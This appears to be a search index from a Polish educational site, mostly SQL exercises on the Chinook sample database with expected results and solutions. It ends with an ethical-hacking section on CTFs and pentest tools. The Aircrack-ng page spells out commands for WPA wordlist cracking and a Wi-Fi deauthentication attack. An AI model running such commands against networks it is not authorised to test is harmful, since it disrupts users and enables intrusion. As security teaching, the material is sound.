LastName BirthDate Andrew Adams 1962-02-18 00:00:00 Nancy Edwards 1958-12-08 00:00:00 Jane Peacock 1973-08-29 00:00:00 Margaret Park 1947-09-19 00:00:00 Steve Johnson 1965-03-03 00:00:00 Michael Mitchell 1973-07-01 00:00:00 Robert King 1970-05-29 00:00:00 Laura Callahan 1968-01-09 00:00:00"},{"location":"databases/sql/exercises/select/#zadanie-7","title":"Zadanie 7","text":"<p>Dla ka\u017cdego pracownika wypisz jego imi\u0119, nazwisko oraz ile mia\u0142 lat, gdy zosta\u0142 zatrudniony. Przy obliczeniach zignoruj miesi\u0105ce i dni.</p>"},{"location":"databases/sql/exercises/select/#10-pierwszych-wierszy-wyniku_6","title":"10 pierwszych wierszy wyniku","text":"FirstName LastName EmploymentAge Andrew Adams 40 Nancy Edwards 44 Jane Peacock 29 Margaret Park 56 Steve Johnson 38 Michael Mitchell 30 Robert King 34 Laura Callahan 36"},{"location":"databases/sql/exercises/select/#zadanie-8","title":"Zadanie 8","text":"<p>Dla ka\u017cdego pracownika wypisz jego imi\u0119, nazwisko oraz d\u0142ugo\u015b\u0107 zatrudnienia w latach. Przy obliczeniach zignoruj miesi\u0105ce i dni.</p>"},{"location":"databases/sql/exercises/select/#10-pierwszych-wierszy-wyniku_7","title":"10 pierwszych wierszy wyniku","text":"FirstName LastName EmploymentYears Andrew Adams 21 Nancy Edwards 21 Jane Peacock 21 Margaret Park 20 Steve Johnson 20 Michael Mitchell 20 Robert King 19 Laura Callahan 19"},{"location":"databases/sql/exercises/select/#zadanie-9","title":"Zadanie 9","text":"<p>Wypisz imi\u0119 i nazwisko ka\u017cdego klienta w jednej kolumnie, oddzielaj\u0105c je znakiem spacji.</p>"},{"location":"databases/sql/exercises/select/#10-pierwszych-wierszy-wyniku_8","title":"10 pierwszych wierszy wyniku","text":"Name Lu\u00eds Gon\u00e7alves Leonie K\u00f6hler Fran\u00e7ois Tremblay Bj\u00f8rn Hansen Franti\u0161ek Wichterlov\u00e1 Helena Hol\u00fd Astrid Gruber Daan Peeters Kara Nielsen Eduardo Martins"},{"location":"databases/sql/exercises/select/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":"<pre><code>SELECT * FROM Artist;\n</code></pre>"},{"location":"databases/sql/exercises/select/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":"<pre><code>SELECT Title FROM Album;\n</code></pre>"},{"location":"databases/sql/exercises/select/solution-3/","title":"Zadanie 3 - rozwi\u0105zanie","text":"<pre><code>SELECT Name, Milliseconds FROM Track;\n</code></pre>"},{"location":"databases/sql/exercises/select/solution-4/","title":"Zadanie 4 - rozwi\u0105zanie","text":"<pre><code>SELECT Name, Milliseconds/(1000*60) AS Minutes FROM Track;\n</code></pre>"},{"location":"databases/sql/exercises/select/solution-5/","title":"Zadanie 5 - rozwi\u0105zanie","text":"<pre><code>SELECT Name, Milliseconds, Milliseconds/1000 AS Seconds, Milliseconds/(1000*60) AS Minutes, Milliseconds/(1000*60*60) AS Hours FROM Track;\n</code></pre>"},{"location":"databases/sql/exercises/select/solution-6/","title":"Zadanie 6 - rozwi\u0105zanie","text":"<pre><code>SELECT FirstName, LastName, BirthDate FROM Employee;\n</code></pre>"},{"location":"databases/sql/exercises/select/solution-7/","title":"Zadanie 7 - rozwi\u0105zanie","text":"<pre><code>SELECT FirstName, LastName, HireDate - BirthDate AS EmploymentAge FROM Employee;\n</code></pre>"},{"location":"databases/sql/exercises/select/solution-8/","title":"Zadanie 8 - rozwi\u0105zanie","text":"<pre><code>SELECT FirstName, LastName, Date('now') - HireDate as EmploymentYears FROM Employee;\n</code></pre>"},{"location":"databases/sql/exercises/select/solution-9/","title":"Zadanie 9 - rozwi\u0105zanie","text":"<pre><code>SELECT FirstName || \" \" || LastName as Name FROM Customer;\n</code></pre>"},{"location":"databases/sql/exercises/where/","title":"WHERE","text":""},{"location":"databases/sql/exercises/where/#zadanie-1","title":"Zadanie 1","text":"<p>Wypisz dane wszystkich klient\u00f3w z Niemiec.</p>"},{"location":"databases/sql/exercises/where/#wynik","title":"Wynik","text":"CustomerId FirstName LastName Company Address City State Country PostalCode Phone Fax Email SupportRepId 2 Leonie K\u00f6hler null Theodor-Heuss-Stra\u00dfe 34 Stuttgart null Germany 70174 +49 0711 2842222 null leonekohler@surfeu.de 5 36 Hannah Schneider null Tauentzienstra\u00dfe 8 Berlin null Germany 10789 +49 030 26550280 null hannah.schneider@yahoo.de 5 37 Fynn Zimmermann null Berger Stra\u00dfe 10 Frankfurt null Germany 60316 +49 069 40598889 null fzimmermann@yahoo.de 3 38 Niklas Schr\u00f6der null Barbarossastra\u00dfe 19 Berlin null Germany 10779 +49 030 2141444 null nschroder@surfeu.de 3"},{"location":"databases/sql/exercises/where/#zadanie-2","title":"Zadanie 2","text":"<p>Wypisz wszystkich klient\u00f3w pochodz\u0105cych z Pragi lub Niemiec.</p>"},{"location":"databases/sql/exercises/where/#wynik_1","title":"Wynik","text":"CustomerId FirstName LastName Company Address City State Country PostalCode Phone Fax Email SupportRepId 2 Leonie K\u00f6hler null Theodor-Heuss-Stra\u00dfe 34 Stuttgart null Germany 70174 +49 0711 2842222 null leonekohler@surfeu.de 5 5 Franti\u0161ek Wichterlov\u00e1 JetBrains s.r.o. Klanova 9/506 Prague null Czech Republic 14700 +420 2 4172 5555 +420 2 4172 5555 frantisekw@jetbrains.com 4 6 Helena Hol\u00fd null Rilsk\u00e1 3174/6 Prague null Czech Republic 14300 +420 2 4177 0449 null hholy@gmail.com 5 36 Hannah Schneider null Tauentzienstra\u00dfe 8 Berlin null Germany 10789 +49 030 26550280 null hannah.schneider@yahoo.de 5 37 Fynn Zimmermann null Berger Stra\u00dfe 10 Frankfurt null Germany 60316 +49 069 40598889 null fzimmermann@yahoo.de 3 38 Niklas Schr\u00f6der null Barbarossastra\u00dfe 19 Berlin null Germany 10779 +49 030 2141444 null nschroder@surfeu.de 3"},{"location":"databases/sql/exercises/where/#zadanie-3","title":"Zadanie 3","text":"<p>Wypisz wszystkich pracownik\u00f3w zatrudnionych po 1 stycznia 2003 roku.</p>"},{"location":"databases/sql/exercises/where/#wynik_2","title":"Wynik","text":"EmployeeId LastName FirstName Title ReportsTo BirthDate HireDate Address City State Country PostalCode Phone Fax Email 4 Park Margaret Sales Support Agent 2 1947-09-19 00:00:00 2003-05-03 00:00:00 683 10 Street SW Calgary AB Canada T2P 5G3 +1 (403) 263-4423 +1 (403) 263-4289 margaret@chinookcorp.com 5 Johnson Steve Sales Support Agent 2 1965-03-03 00:00:00 2003-10-17 00:00:00 7727B 41 Ave Calgary AB Canada T3B 1Y7 1 (780) 836-9987 1 (780) 836-9543 steve@chinookcorp.com 6 Mitchell Michael IT Manager 1 1973-07-01 00:00:00 2003-10-17 00:00:00 5827 Bowness Road NW Calgary AB Canada T3B 0C5 +1 (403) 246-9887 +1 (403) 246-9899 michael@chinookcorp.com 7 King Robert IT Staff 6 1970-05-29 00:00:00 2004-01-02 00:00:00 590 Columbia Boulevard West Lethbridge AB Canada T1K 5N8 +1 (403) 456-9986 +1 (403) 456-8485 robert@chinookcorp.com 8 Callahan Laura IT Staff 6 1968-01-09 00:00:00 2004-03-04 00:00:00 923 7 ST NW Lethbridge AB Canada T1H 1Y8 +1 (403) 467-3351 +1 (403) 467-8772 laura@chinookcorp.com"},{"location":"databases/sql/exercises/where/#zadanie-4","title":"Zadanie 4","text":"<p>Utw\u00f3rz zestawienie zawieraj\u0105ce nazw\u0119 i d\u0142ugo\u015b\u0107 trwania utwor\u00f3w d\u0142u\u017cszych ni\u017c \\(10\\) minut.</p>"},{"location":"databases/sql/exercises/where/#10-pierwszych-wierszy-wyniku","title":"10 pierwszych wierszy wyniku","text":"Name Milliseconds How Many More Times 711836 Advance Romance 677694 Mercyful Fate 671712 Mistreated 758648 You Fool No One 804101 In My Time Of Dying 666017 The Calling 747755 Walkin' 807392 My Funny Valentine (Live) 907520 Miles Runs The Voodoo Down 843964"},{"location":"databases/sql/exercises/where/#zadnie-5","title":"Zadnie 5","text":"<p>Wypisz imi\u0119 i nazwisko wszystkich klient\u00f3w, kt\u00f3rych imi\u0119 lub nazwisko ko\u0144czy si\u0119 na liter\u0119 a.</p>"},{"location":"databases/sql/exercises/where/#wynik_3","title":"Wynik","text":"FirstName LastName Helena Hol\u0102\u02dd Kara Nielsen Alexandre Rocha Roberto Almeida Fernanda Ramos Julia Barnett Martha Silk Madalena Sampaio Emma Jones Puja Srivastava"},{"location":"databases/sql/exercises/where/#zadanie-6","title":"Zadanie 6","text":"<p>Wypisz imi\u0119 i nazwisko wszystkich klient\u00f3w, kt\u00f3rych imi\u0119 lub nazwisko zaczyna si\u0119 na liter\u0119 A.</p>"},{"location":"databases/sql/exercises/where/#wynik_4","title":"Wynik","text":"FirstName LastName Astrid Gruber Alexandre Rocha Roberto Almeida Aaron Mitchell"},{"location":"databases/sql/exercises/where/#zadanie-7","title":"Zadanie 7","text":"<p>Wypisz imi\u0119 i nazwisko wszystkich klient\u00f3w, kt\u00f3rzy maj\u0105 liter\u0119 e w nazwisku.</p>"},{"location":"databases/sql/exercises/where/#10-pierwszych-wierszy-wyniku_1","title":"10 pierwszych wierszy wyniku","text":"FirstName LastName Lu\u00eds Gon\u00e7alves Leonie K\u00f6hler Fran\u00e7ois Tremblay Bj\u00f8rn Hansen Franti\u0161ek Wichterlov\u00e1 Astrid Gruber Daan Peeters Kara Nielsen Roberto Almeida Jennifer Peterson"},{"location":"databases/sql/exercises/where/#zadanie-8","title":"Zadanie 8","text":"<p>Wypisz imi\u0119 i nazwisko tylko tych klient\u00f3w, kt\u00f3rzy nie maj\u0105 wpisanej firmy.</p>"},{"location":"databases/sql/exercises/where/#10-pierwszych-wierszy-wyniku_2","title":"10 pierwszych wierszy wyniku","text":"FirstName LastName Leonie K\u00f6hler Fran\u00e7ois Tremblay Bj\u00f8rn Hansen Helena Hol\u00fd Astrid Gruber Daan Peeters Kara Nielsen Fernanda Ramos Michelle Brooks Dan Miller"},{"location":"databases/sql/exercises/where/#zadanie-9","title":"Zadanie 9","text":"<p>Wypisz imi\u0119 i nazwisko tylko tych klient\u00f3w, kt\u00f3rzy maj\u0105 podan\u0105\u00a0firm\u0119.</p>"},{"location":"databases/sql/exercises/where/#wynik_5","title":"Wynik","text":"FirstName LastName Lu\u00eds Gon\u00e7alves Franti\u0161ek Wichterlov\u00e1 Eduardo Martins Alexandre Rocha Roberto Almeida Mark Philips Jennifer Peterson Frank Harris Jack Smith Tim Goyer"},{"location":"databases/sql/exercises/where/#zadanie-10","title":"Zadanie 10","text":"<p>Wypisz wszystkich pracownik\u00f3w, kt\u00f3rzy mieli co najmniej 50 lat w 2018 roku.</p>"},{"location":"databases/sql/exercises/where/#wynik_6","title":"Wynik","text":"EmployeeId LastName FirstName Title ReportsTo BirthDate HireDate Address City State Country PostalCode Phone Fax Email 1 Adams Andrew General Manager null 1962-02-18 00:00:00 2002-08-14 00:00:00 11120 Jasper Ave NW Edmonton AB Canada T5K 2N1 +1 (780) 428-9482 +1 (780) 428-3457 andrew@chinookcorp.com 2 Edwards Nancy Sales Manager 1 1958-12-08 00:00:00 2002-05-01 00:00:00 825 8 Ave SW Calgary AB Canada T2P 2T3 +1 (403) 262-3443 +1 (403) 262-3322 nancy@chinookcorp.com 4 Park Margaret Sales Support Agent 2 1947-09-19 00:00:00 2003-05-03 00:00:00 683 10 Street SW Calgary AB Canada T2P 5G3 +1 (403) 263-4423 +1 (403) 263-4289 margaret@chinookcorp.com 5 Johnson Steve Sales Support Agent 2 1965-03-03 00:00:00 2003-10-17 00:00:00 7727B 41 Ave Calgary AB Canada T3B 1Y7 1 (780) 836-9987 1 (780) 836-9543 steve@chinookcorp.com 8 Callahan Laura IT Staff 6 1968-01-09 00:00:00 2004-03-04 00:00:00 923 7 ST NW Lethbridge AB Canada T1H 1Y8 +1 (403) 467-3351 +1 (403) 467-8772 laura@chinookcorp.com"},{"location":"databases/sql/exercises/where/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":"<pre><code>SELECT * FROM Customer WHERE Country = \"Germany\";\n</code></pre>"},{"location":"databases/sql/exercises/where/solution-10/","title":"Zadanie 10 - rozwi\u0105zanie","text":"<pre><code>SELECT * FROM Employee WHERE '2018-01-01' - BirthDate &gt;= 50;\n</code></pre>"},{"location":"databases/sql/exercises/where/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":"<pre><code>SELECT * FROM Customer WHERE Country = \"Germany\" OR City = \"Prague\";\n</code></pre>"},{"location":"databases/sql/exercises/where/solution-3/","title":"Zadanie 3 - rozwi\u0105zanie","text":"<pre><code>SELECT * FROM Employee WHERE HireDate &gt; '2003-01-01';\n</code></pre>"},{"location":"databases/sql/exercises/where/solution-4/","title":"Zadanie 4 - rozwi\u0105zanie","text":"<pre><code>SELECT Name, Milliseconds FROM Track WHERE Milliseconds/(1000*60) &gt; 10;\n</code></pre>"},{"location":"databases/sql/exercises/where/solution-5/","title":"Zadanie 5 - rozwi\u0105zanie","text":"<pre><code>SELECT FirstName, LastName FROM Customer WHERE FirstName LIKE '%a' OR LastName LIKE '%a';\n</code></pre>"},{"location":"databases/sql/exercises/where/solution-6/","title":"Zadanie 6 - rozwi\u0105zanie","text":"<pre><code>SELECT FirstName, LastName FROM Customer WHERE FirstName LIKE 'A%' OR LastName LIKE 'A%';\n</code></pre>"},{"location":"databases/sql/exercises/where/solution-7/","title":"Zadanie 7 - rozwi\u0105zanie","text":"<pre><code>SELECT FirstName, LastName FROM Customer WHERE LastName LIKE '%e%';\n</code></pre>"},{"location":"databases/sql/exercises/where/solution-8/","title":"Zadanie 8 - rozwi\u0105zanie","text":"<pre><code>SELECT FirstName, LastName FROM Customer WHERE Company IS NULL;\n</code></pre>"},{"location":"databases/sql/exercises/where/solution-9/","title":"Zadanie 9 - rozwi\u0105zanie","text":"<pre><code>SELECT FirstName, LastName FROM Customer WHERE Company IS NOT NULL;\n</code></pre>"},{"location":"en/","title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>"},{"location":"en/#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"en/#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"ethical-hacking/","title":"Etyczne hakowanie","text":"<p>Wsp\u00f3\u0142cze\u015bnie wiele naszych danych znajduje si\u0119 na komputerach: zdj\u0119cia, teksty, gry, programy, itp. Nasze informacje udost\u0119pniamy w sieci internetowej, chocia\u017c nie zawsze robimy to \u015bwiadomie. Tym wa\u017cniejsze jest by ka\u017cdy wiedzia\u0142, jakie zagro\u017cenia czekaj\u0105 na nas w cyfrowym \u015bwiecie i jak si\u0119 przed nimi chroni\u0107. Etyczne hakowanie to legalna praktyka testowania system\u00f3w informatycznych, kt\u00f3ra ma na celu wykrycie luk bezpiecze\u0144stwa. Informacje zawarte w tej sekcji dotycz\u0105 szeroko poj\u0119tego hakowania: \u0142amania hase\u0142, w\u0142amywania si\u0119 na konta, wykradania danych i innych dzia\u0142a\u0144. Przedstawione s\u0105 nie po to, by nauczy\u0107 stosowania takich praktyk, ale by wiedzie\u0107, do czego zdolni s\u0105 uzdolnieni hakerzy i jak si\u0119 przed takimi atakami broni\u0107. </p>"},{"location":"ethical-hacking/passwords/","title":"Has\u0142a","text":"<p>Kr\u00f3tka prezentacja na temat tego, jak ludzie dbaj\u0105 o swoje dane.</p> <p> Has\u0142a</p>"},{"location":"ethical-hacking/ctf/","title":"CTF (Capture The Flag)","text":"<p>CTF, czyli Capture The Flag, to popularna forma konkurs\u00f3w zwi\u0105zanych z cyberbezpiecze\u0144stwem. Zadaniem uczestnik\u00f3w jest rozwi\u0105zanie serii zada\u0144, kt\u00f3re mog\u0105 obejmowa\u0107 r\u00f3\u017cne aspekty bezpiecze\u0144stwa informatycznego, takie jak in\u017cynieria odwrotna, kryptoanaliza, eksploatacja, forensyka cyfrowa, steganografia, a nawet webowe luki bezpiecze\u0144stwa.</p> <p>Konkursy CTF maj\u0105 na celu edukacj\u0119 i popularyzacj\u0119 wiedzy na temat cyberbezpiecze\u0144stwa w praktyczny, anga\u017cuj\u0105cy spos\u00f3b. Dzi\u0119ki nim uczestnicy maj\u0105 okazj\u0119 uczy\u0107 si\u0119 nowych umiej\u0119tno\u015bci, testowa\u0107 swoje zdolno\u015bci i rywalizowa\u0107 z innymi entuzjastami bezpiecze\u0144stwa.</p>"},{"location":"ethical-hacking/ctf/#rodzaje-konkursow-ctf","title":"Rodzaje konkurs\u00f3w CTF","text":"<p>Konkursy CTF zazwyczaj dziel\u0105 si\u0119 na dwie g\u0142\u00f3wne kategorie: Jeopardy-style CTF oraz Attack-Defense CTF.</p>"},{"location":"ethical-hacking/ctf/#jeopardy-style-ctf","title":"Jeopardy-style CTF","text":"<p>W tych konkursach zadania s\u0105 podzielone na kategorie i maj\u0105 r\u00f3\u017cne warto\u015bci punkt\u00f3w w zale\u017cno\u015bci od trudno\u015bci. Zespo\u0142y (lub pojedynczy gracze) wybieraj\u0105 i rozwi\u0105zuj\u0105 zadania, zdobywaj\u0105c w ten spos\u00f3b punkty. Na koniec konkursu zesp\u00f3\u0142 z najwi\u0119ksz\u0105 liczb\u0105 punkt\u00f3w wygrywa.</p>"},{"location":"ethical-hacking/ctf/#attack-defense-ctf","title":"Attack-Defense CTF","text":"<p>W tych konkursach ka\u017cdy zesp\u00f3\u0142 ma swoj\u0105 sie\u0107 lub system do obrony, a jednocze\u015bnie pr\u00f3buje atakowa\u0107 sieci innych zespo\u0142\u00f3w. Zespo\u0142y zdobywaj\u0105 punkty za utrzymanie swoich us\u0142ug dzia\u0142aj\u0105cych, a tak\u017ce za udane ataki na inne zespo\u0142y.</p>"},{"location":"ethical-hacking/ctf/#platformy-ctf","title":"Platformy CTF","text":"<p>Istnieje wiele platform online, kt\u00f3re organizuj\u0105 konkursy CTF lub dostarczaj\u0105 zadania do samodzielnego rozwi\u0105zania, takie jak:</p> <ul> <li>CTFtime (ctftime.org) - strona z informacjami o nadchodz\u0105cych konkursach CTF na ca\u0142ym \u015bwiecie.</li> <li>Hack The Box (hackthebox.eu) - platforma z setkami maszyn i zada\u0144 do w\u0142amania.</li> <li>PicoCTF (picoctf.org) - platforma edukacyjna stworzona specjalnie dla m\u0142odzie\u017cy, ale dost\u0119pna dla wszystkich.</li> </ul>"},{"location":"ethical-hacking/ctf/#narzedzia","title":"Narz\u0119dzia","text":"<p>Oto lista przyk\u0142adowych narz\u0119dzi, kt\u00f3re mog\u0105 okaza\u0107 si\u0119 pomocne podczas konkurs\u00f3w typu Capture The Flag (CTF). Przy wyborze narz\u0119dzi warto zwr\u00f3ci\u0107 uwag\u0119 na rodzaj zada\u0144, kt\u00f3re najcz\u0119\u015bciej pojawiaj\u0105 si\u0119 w konkursach, a tak\u017ce na w\u0142asne umiej\u0119tno\u015bci i preferencje.</p> <ul> <li>Wireshark - popularny analizator pakiet\u00f3w sieciowych, u\u017cywany do przechwytywania i analizy ruchu sieciowego.</li> <li>Nmap - narz\u0119dzie do skanowania sieci i host\u00f3w, u\u017cywane do odkrywania otwartych port\u00f3w i us\u0142ug.</li> <li>Burp Suite - zintegrowane \u015brodowisko do testowania bezpiecze\u0144stwa aplikacji webowych.</li> <li>John the Ripper - narz\u0119dzie do \u0142amania hase\u0142, u\u017cywane do atak\u00f3w s\u0142ownikowych i brute force.</li> <li>Metasploit - framework do test\u00f3w penetracyjnych, u\u017cywany do tworzenia i uruchamiania eksploit\u00f3w.</li> <li>Ghidra / IDA Pro - narz\u0119dzia do in\u017cynierii odwrotnej, u\u017cywane do analizy binarnych plik\u00f3w wykonywalnych.</li> <li>Volatility - narz\u0119dzie do analizy pami\u0119ci, u\u017cywane w forensyce cyfrowej.</li> <li>Steghide / Stegosuite - narz\u0119dzia do steganografii, u\u017cywane do ukrywania i wyodr\u0119bniania danych z plik\u00f3w.</li> <li>OpenSSL - zestaw narz\u0119dzi kryptograficznych, u\u017cywanych do szyfrowania, deszyfrowania, generowania kluczy, itp.</li> <li>Aircrack-ng - pakiet narz\u0119dzi do testowania bezpiecze\u0144stwa sieci Wi-Fi.</li> <li>SQLmap - narz\u0119dzie do wykrywania i eksploatacji luk SQL Injection w aplikacjach webowych.</li> <li>Binwalk - narz\u0119dzie do analizy, dekompresji i wyodr\u0119bniania danych z plik\u00f3w binarnych.</li> </ul> <p>Wszystkie te narz\u0119dzia s\u0105 dost\u0119pne na wi\u0119kszo\u015bci dystrybucji Linuxa. Dystrybucje takie jak Kali Linux lub Parrot Security s\u0105 specjalnie zaprojektowane do test\u00f3w penetracyjnych i zawieraj\u0105 wiele z tych narz\u0119dzi preinstalowanych.</p>"},{"location":"ethical-hacking/tools/","title":"Narz\u0119dzia etycznego hakowania","text":"<p>Etyczni hakerzy, nazywani te\u017c testerami penetracji, korzystaj\u0105 z r\u00f3\u017cnych narz\u0119dzi do przeprowadzania swoich test\u00f3w. Poni\u017cej przedstawiamy kilka z najpopularniejszych narz\u0119dzi.</p>"},{"location":"ethical-hacking/tools/#kali-linux","title":"Kali Linux","text":"<p>Kali Linux to dystrybucja systemu operacyjnego Linux, stworzona specjalnie dla etycznych haker\u00f3w. Kali Linux zawiera ponad 600 narz\u0119dzi do testowania penetracyjnego, w tym Wireshark, Nmap, Aircrack-ng i wiele innych.</p> <p>Kali Linux</p>"},{"location":"ethical-hacking/tools/#nmap","title":"Nmap","text":"<p>Nmap (Network Mapper) to pot\u0119\u017cne narz\u0119dzie do skanowania sieci i port\u00f3w. Jest szeroko u\u017cywane do odkrywania host\u00f3w i us\u0142ug w sieci, co pozwala u\u017cytkownikowi utworzy\u0107 \"map\u0119\" sieci.</p> <p>Nmap</p>"},{"location":"ethical-hacking/tools/#wireshark","title":"Wireshark","text":"<p>Wireshark to analizator protoko\u0142\u00f3w sieciowych, kt\u00f3ry pozwala na przechwytywanie i interaktywn\u0105 analiz\u0119 ruchu sieciowego. Jest to nieocenione narz\u0119dzie do diagnozowania problem\u00f3w sieciowych, analizy pakiet\u00f3w i rozwi\u0105zywania problem\u00f3w bezpiecze\u0144stwa.</p> <p>Wireshark</p>"},{"location":"ethical-hacking/tools/#metasploit","title":"Metasploit","text":"<p>Metasploit to zestaw narz\u0119dzi do testowania penetracyjnego, kt\u00f3re pozwalaj\u0105 na odkrywanie, eksploatowanie i walidowanie luk bezpiecze\u0144stwa. G\u0142\u00f3wnym komponentem jest Metasploit Framework, modu\u0142owy system do tworzenia i uruchamiania eksploit\u00f3w.</p> <p>Metasploit</p>"},{"location":"ethical-hacking/tools/#burp-suite","title":"Burp Suite","text":"<p>Burp Suite to platforma do testowania bezpiecze\u0144stwa aplikacji webowych. Zawiera r\u00f3\u017cne narz\u0119dzia, w tym proxy do przechwytywania ruchu, skaner do automatycznego wykrywania luk, a tak\u017ce narz\u0119dzia do manipulowania i powtarzania \u017c\u0105da\u0144 HTTP.</p> <p>Burp Suite</p>"},{"location":"ethical-hacking/tools/#aircrack-ng","title":"Aircrack-ng","text":"<p>Aircrack-ng to kompletny zestaw narz\u0119dzi do oceny bezpiecze\u0144stwa sieci Wi-Fi. Pozwala na przechwytywanie pakiet\u00f3w, monitorowanie ruchu sieciowego, przeprowadzanie atak\u00f3w i testowanie zabezpiecze\u0144 sieci Wi-Fi.</p> <p>Aircrack-ng</p>"},{"location":"ethical-hacking/tools/#owasp-zap","title":"OWASP ZAP","text":"<p>ZAP (Zed Attack Proxy) to jedno z wiod\u0105cych na \u015bwiecie narz\u0119dzi do testowania penetracyjnego aplikacji webowych. Jest to dost\u0119pny za darmo projekt OWASP (Open Web Application Security Project).</p> <p>OWASP ZAP</p> <p>Info</p> <p>Pami\u0119taj, \u017ce narz\u0119dzia te s\u0105 pot\u0119\u017cne i powinny by\u0107 u\u017cywane odpowiedzialnie i zgodnie z prawem. Zawsze uzyskaj uprawnienia do przeprowadzenia test\u00f3w penetracyjnych i nigdy nie u\u017cywaj tych narz\u0119dzi do nielegalnych dzia\u0142a\u0144.</p>"},{"location":"ethical-hacking/tools/aircrack-ng/","title":"Aircrack-ng","text":"<p>Aircrack-ng to kompletne narz\u0119dzie do oceny bezpiecze\u0144stwa sieci Wi-Fi. Zawiera r\u00f3\u017cne programy do przechwytywania pakiet\u00f3w, monitorowania ruchu sieciowego, atak\u00f3w typu brute-force na klucze sieci Wi-Fi oraz testowania bezpiecze\u0144stwa sieci bezprzewodowych.</p> <p>Warning</p> <p>U\u017cywanie Aircrack-ng, podobnie jak ka\u017cdego innego narz\u0119dzia do testowania penetracji, wymaga uprzedniego uzyskania zgody od w\u0142a\u015bciciela sieci. Bez odpowiednich uprawnie\u0144, korzystanie z Aircrack-ng jest nielegalne.</p> <p>Aircrack-ng</p>"},{"location":"ethical-hacking/tools/aircrack-ng/#podstawowe-funkcje-i-zastosowania","title":"Podstawowe funkcje i zastosowania","text":"<p>Poni\u017cej przedstawimy kilka r\u00f3\u017cnych funkcji i zastosowa\u0144 Aircrack-ng.</p>"},{"location":"ethical-hacking/tools/aircrack-ng/#przechwytywanie-pakietow","title":"Przechwytywanie pakiet\u00f3w","text":"<p>Aby przechwyci\u0107 pakiety w sieci bezprzewodowej mo\u017cna u\u017cy\u0107 programu airmon-ng do prze\u0142\u0105czenia karty sieciowej w tryb monitorowania, a nast\u0119pnie airodump-ng do przechwytywania pakiet\u00f3w:</p> <pre><code>airmon-ng start wlan0\nairodump-ng wlan0mon\n</code></pre>"},{"location":"ethical-hacking/tools/aircrack-ng/#atak-typu-brute-force-na-haso-sieci-wi-fi","title":"Atak typu brute-force na has\u0142o sieci Wi-Fi","text":"<p>Gdy pakiety s\u0105 ju\u017c przechwytywane, mo\u017cna u\u017cy\u0107 aircrack-ng do ataku typu brute-force na has\u0142o sieci Wi-Fi. Poni\u017cej przyk\u0142ad ataku na sie\u0107 z WPA PSK:</p> <pre><code>aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap\n</code></pre> <p>Gdzie:</p> <ul> <li><code>wordlist.txt</code> to plik z list\u0105 hase\u0142 do wypr\u00f3bowania,</li> <li><code>00:11:22:33:44:55</code> to adres MAC punktu dost\u0119powego,</li> <li><code>capture.cap</code> to plik z przechwyconymi pakietami.</li> </ul>"},{"location":"ethical-hacking/tools/aircrack-ng/#atak-deautentykacji","title":"Atak deautentykacji","text":"<p>Atak deautentykacji, czyli od\u0142\u0105czanie u\u017cytkownik\u00f3w od sieci, mo\u017ce by\u0107 przeprowadzony za pomoc\u0105 aireplay-ng:</p> <pre><code>aireplay-ng --deauth 100 -a 00:11:22:33:44:55 wlan0mon\n</code></pre> <p>Gdzie \\(100\\) to liczba pakiet\u00f3w deautentykacji do wys\u0142ania, a <code>00:11:22:33:44:55</code> to adres MAC punktu dost\u0119powego.</p>"},{"location":"ethical-hacking/tools/binwalk/","title":"Binwalk","text":"<p>Binwalk to narz\u0119dzie do analizy, dekompresji i wyodr\u0119bniania danych z plik\u00f3w binarnych. Jest szczeg\u00f3lnie u\u017cyteczny w sytuacjach, kiedy trzeba zbada\u0107 zawarto\u015b\u0107 firmware'u lub innych plik\u00f3w binarnych. Mo\u017ce identyfikowa\u0107 r\u00f3\u017cne typy danych za pomoc\u0105 ich sygnatur i umo\u017cliwia ekstrakcj\u0119 tych danych do dalszej analizy.</p> <p>Binwalk skanuje plik binarny i szuka znanych sygnatur (tj. sekwencji bajt\u00f3w, kt\u00f3re s\u0105 charakterystyczne dla okre\u015blonego typu danych). Te sygnatury mog\u0105 obejmowa\u0107 r\u00f3\u017cne typy danych, takie jak obrazy JPEG, archiwa ZIP, skompilowane pliki wykonywalne i wiele innych. Kiedy Binwalk znajduje znan\u0105 sygnatur\u0119, pokazuje jej po\u0142o\u017cenie w pliku i typ danych, kt\u00f3ry reprezentuje.</p> <p>Binwalk</p>"},{"location":"ethical-hacking/tools/binwalk/#przykady-uzycia","title":"Przyk\u0142ady u\u017cycia","text":""},{"location":"ethical-hacking/tools/binwalk/#analiza-pliku-binarnego","title":"Analiza pliku binarnego","text":"<p>Poni\u017csze polecenie skanuje plik file.bin i pokazuje wszystkie znalezione sygnatury:</p> <pre><code>binwalk file.bin\n</code></pre>"},{"location":"ethical-hacking/tools/binwalk/#ekstrakcja-danych","title":"Ekstrakcja danych","text":"<p>Binwalk umo\u017cliwia r\u00f3wnie\u017c ekstrakcj\u0119 danych na podstawie znalezionych sygnatur. W tym celu korzystamy z opcji <code>-e</code>. Poni\u017csze polecenie ekstrahuje wszystkie dane z pliku <code>file.bin</code>:</p> <pre><code>binwalk -e file.bin\n</code></pre>"},{"location":"ethical-hacking/tools/hashcat/","title":"Hashcat","text":"<p>Hashcat jest jednym z najpot\u0119\u017cniejszych narz\u0119dzi do \u0142amania hase\u0142 dost\u0119pnych na rynku. Umo\u017cliwia przeprowadzanie bardzo szybkich operacji ataku na has\u0142a, wykorzystuj\u0105c moc obliczeniow\u0105 procesor\u00f3w CPU, jak r\u00f3wnie\u017c GPU. Obs\u0142uguje wiele r\u00f3\u017cnych typ\u00f3w algorytm\u00f3w hashuj\u0105cych, takich jak MD5, SHA1, SHA256, SHA512, NTLM i wiele innych.</p> <p>Hashcat dokonuje tzw. ataku si\u0142owego lub ataku s\u0142ownikowego na has\u0142a, pr\u00f3buj\u0105c odgadn\u0105\u0107 je na podstawie dostarczonych mu danych wej\u015bciowych. Mo\u017ce to zrobi\u0107 na 